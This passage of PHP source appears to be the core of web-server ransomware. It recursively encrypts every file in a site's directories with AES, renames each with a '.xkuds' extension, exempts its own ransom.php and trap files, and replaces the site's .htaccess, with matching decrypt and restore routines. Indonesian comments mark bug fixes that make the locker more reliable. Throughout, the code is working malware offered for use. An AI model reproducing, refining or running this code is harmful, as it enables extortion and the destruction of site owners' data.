    public static function shcpackUnstall() {
        $results = [];
        if (file_exists(".htaXkuds")) {
            // FIX: Hapus enc.php terlebih dahulu sebelum memodifikasi .htaccess
            if (file_exists("enc.php")) {
                unlink("enc.php");
                $results[] = ['type' => 'success', 'msg' => 'Removed enc.php.'];
            }

            // FIX: Hapus .htaccess yang trap (bukan yang asli)
            if (file_exists(".htaccess")) {
                unlink(".htaccess");
            }

            // FIX: Restore .htaccess asli dari backup .htaXkuds
            if (rename(".htaXkuds", ".htaccess")) {
                $results[] = ['type' => 'info', 'msg' => 'Restored original .htaccess and removed trap files.'];
            } else {
                // FIX: Jika rename gagal (misal .htaccess sudah ada), coba unlink dulu
                if (file_exists(".htaccess")) unlink(".htaccess");
                if (rename(".htaXkuds", ".htaccess")) {
                    $results[] = ['type' => 'info', 'msg' => 'Restored original .htaccess and removed trap files.'];
                } else {
                    $results[] = ['type' => 'error', 'msg' => 'Failed to restore .htaccess from backup.'];
                }
            }
        } else {
            $results[] = ['type' => 'error', 'msg' => 'No backup (.htaXkuds) found. Cannot restore.'];
        }
        return $results;
    }

    public static function shcdirs($dir, $method, $key) {
        $logs = [];

        // FIX: Pastikan instalasi/uninstall dilakukan di direktori utama sebelum rekursi
        if ($dir === getcwd()) {
            if ($method == '1') {
                $logs = array_merge($logs, self::shcpackInstall());
            } elseif ($method == '2') {
                $logs = array_merge($logs, self::shcpackUnstall());
            }
        }

        $files = scandir($dir);
        if ($files === false) {
            return $logs;
        }

        foreach ($files as $d) {
            if ($d == '.' || $d == '..') continue;
            $locate = $dir . DIRECTORY_SEPARATOR . $d;

            if (!is_dir($locate)) {
                $basename = basename($locate);

                // FIX: Tambahkan proteksi untuk file yang sudah ter-encrypt (.xkuds)
                // dan file hasil decrypt yang mungkin sudah diproses
                $protected = [
                    "robots.php",
                    "ransom.php",
                    ".htaccess",
                    "index.php",
                    "enc.php",
                    ".htaXkuds",
                    basename(__FILE__)
                ];

                // FIX: Saat encrypt (method 1), skip file yang sudah memiliki ekstensi .xkuds
                // untuk mencegah double encryption
                if ($method == '1' && substr($basename, -6) === ".xkuds") {
                    continue;
                }

                // FIX: Saat decrypt (method 2), skip file yang TIDAK memiliki ekstensi .xkuds
                // karena berarti file tersebut belum pernah di-encrypt oleh script ini
                if ($method == '2' && substr($basename, -6) !== ".xkuds") {
                    continue;
                }

                if (!in_array($basename, $protected)) {
                    if ($method == '1') {
                        $logs[] = self::shcEnCry($key, $locate);
                        // FIX: Rename dilakukan SETELAH encrypt berhasil
                        self::shcEnDesDirS($locate, "1");
                    } elseif ($method == '2') {
                        // FIX: Decrypt dulu, lalu rename (hapus ekstensi .xkuds)
                        self::shcEnDesDirS($locate, "2");
                        // FIX: Decrypt file yang sudah di-rename ke nama aslinya
                        $originalName = substr($locate, 0, -6);
                        $logs[] = self::shcDeCry($key, $originalName);
                    }
                }
            } else {
                $logs = array_merge($logs, self::shcdirs($locate, $method, $key));
            }
        }
        return $logs;
    }

    public static function shcEnDesDirS($locate, $method) {
        if ($method == '1') {
            // FIX: Tambahkan pengecekan apakah file yang akan di-rename masih ada
            if (file_exists($locate) && substr($locate, -6) !== ".xkuds") {
                if (rename($locate, $locate . ".xkuds")) {
                    return true;
                }
                return false;
            }
        } elseif ($method == '2') {
            // FIX: Cek apakah file memang punya ekstensi .xkuds sebelum rename
            if (file_exists($locate) && substr($locate, -6) === ".xkuds") {
                $new_name = substr($locate, 0, -6);
                // FIX: Cek apakah nama target sudah ada untuk menghindari overwrite
                if (!file_exists($new_name)) {
                    if (rename($locate, $new_name)) {
                        return true;
                    }
                } else {
                    // FIX: Jika target sudah ada, hapus yang lama dan rename
                    unlink($new_name);
                    if (rename($locate, $new_name)) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    public static function shcEnCry($key, $locate) {
        if (!function_exists('mcrypt_encrypt')) {
            return ['type' => 'error', 'msg' => "Locked (Failed: mcrypt extension missing) | $locate"];
        }

        // FIX: Tambahkan pengecekan apakah file yang akan di-encrypt masih ada
        if (!file_exists($locate)) {
            return ['type' => 'error', 'msg' => "Locked (Failed: file not found) | $locate"];
        }

        $data = file_get_contents($locate);
        if ($data === false) {
            return ['type' => 'error', 'msg' => "Locked (Failed: cannot read file) | $locate"];
        }

        $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
        $iv = mcrypt_create_iv($iv_size, MCRYPT_DEV_URANDOM);
        $encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, hash('sha256', $key, true), $data, MCRYPT_MODE_CBC, $iv);

        // FIX: Simpan IV + encrypted data dalam base64
        $encoded = base64_encode($iv . $encrypted);
        if (file_put_contents($locate, $encoded) !== false) {
            return ['type' => 'success', 'msg' => "Locked (Success) | $locate"];
        }
        return ['type' => 'error', 'msg' => "Locked (Failed) | $locate"];
    }

    public static function shcDeCry($key, $locate) {
        if (!function_exists('mcrypt_decrypt')) {
            return ['type' => 'error', 'msg' => "Unlock (Failed: mcrypt extension missing) | $locate"];
        }

        // FIX: Tambahkan pengecekan apakah file yang akan di-decrypt masih ada
        if (!file_exists($locate)) {
            return ['type' => 'error', 'msg' => "Unlock (Failed: file not found) | $locate"];
        }

        $raw_data = file_get_contents($locate);
        if ($raw_data === false) {
            return ['type' => 'error', 'msg' => "Unlock (Failed: cannot read file) | $locate"];
        }

        $data = base64_decode($raw_data, true);
        // FIX: Cek apakah base64_decode berhasil
        if ($data === false) {
            return ['type' => 'error', 'msg' => "Unlock (Failed: invalid base64 data) | $locate"];
        }

        $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);

        // FIX: Cek apakah data cukup panjang untuk mengandung IV
        if (strlen($data) < $iv_size) {
            return ['type' => 'error', 'msg' => "Unlock (Failed: data too short) | $locate"];
        }

        $iv = substr($data, 0, $iv_size);
        $decrypted = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, hash('sha256', $key, true), substr($data, $iv_size), MCRYPT_MODE_CBC, $iv);
        $decrypted = rtrim($decrypted, "\0");

        if (file_put_contents($locate, $decrypted) !== false) {
            return ['type' => 'success', 'msg' => "Unlock (Success) | $locate"];
        }
        return ['type' => 'error', 'msg' => "Unlock (Failed) | $locate"];
    }
